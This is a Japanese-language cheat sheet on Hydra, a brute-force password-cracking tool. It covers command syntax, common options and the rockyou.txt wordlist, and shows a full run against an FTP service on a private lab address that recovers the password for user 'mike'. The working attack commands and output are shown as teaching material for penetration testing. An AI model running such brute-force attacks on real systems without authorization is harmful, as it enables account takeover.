## 1.hydraとは
- 能動的パスワードクラックを行うツール
- 総当たりでパスワードを試行する
- SSHやFTPなどのサービスや、Webアプリのログインフォームに対して攻撃が可能
- `wordlist`の使用が可能  
  
## 2.構　文
### 2-1.ユーザ名が既知
```bash
hydra -l <ユーザ名> -P <パスワードリスト> <IPアドレス> <プロトコル>
```
  
### 2-2.ユーザ名、パスワード共にクラック
```bash
hydra -L <ユーザリストファイル> -P <パスワードリスト> http:<ターゲットのパス>
```
## 3.代表的なオプション
- `-l`：`ユーザ名`、あるいは`ID`が既知のとき、直接指定するオプション  
- `-L`：`ユーザリストファイルリスト`を指定するオプション
- `-p`：`パスワード`が既知の時、直接指定するオプション
- `-P`：`パスワードリストファイルリスト`を指定するオプション 
- `-V`：詳細の出力
- `-vV`：更に詳細の出力
- `-f`：ログインに成功したらそのタイミングで総当たりをやめる
- `-t`：ターゲット毎に並列に接続する数を指定（デフォルト：16）
  
## 4.頻出パスワードリスト
- `/usr/share/wordlists/rockyou.txt`  
  
## 5.実行例
- `ユーザ名`が`mike`で`パスワードリスト`に`/usr/share/wordlists/rockyou.txt`を指定  
- パスワードが`password`であると解析  
```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.35.212 ftp     
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-09 21:55:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.35.212:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.35.212 - login "mike" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[21][ftp] host: 10.10.35.212   login: mike   password: password
[STATUS] attack finished for 10.10.35.212 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-09 21:55:28
```
  
## 6.参　考
[kali linuxでhydraを使ってパスワードクラックをしてみた - Qiita](https://qiita.com/miya_zato/items/0c32dc71208460515e34)  
[ハッカーはhydraでログインクラックを確認する(Kali Linux) - AIを武器にホワイトハッカーになる](https://whitemarkn.com/learning-ethical-hacker/hydra/)  
  
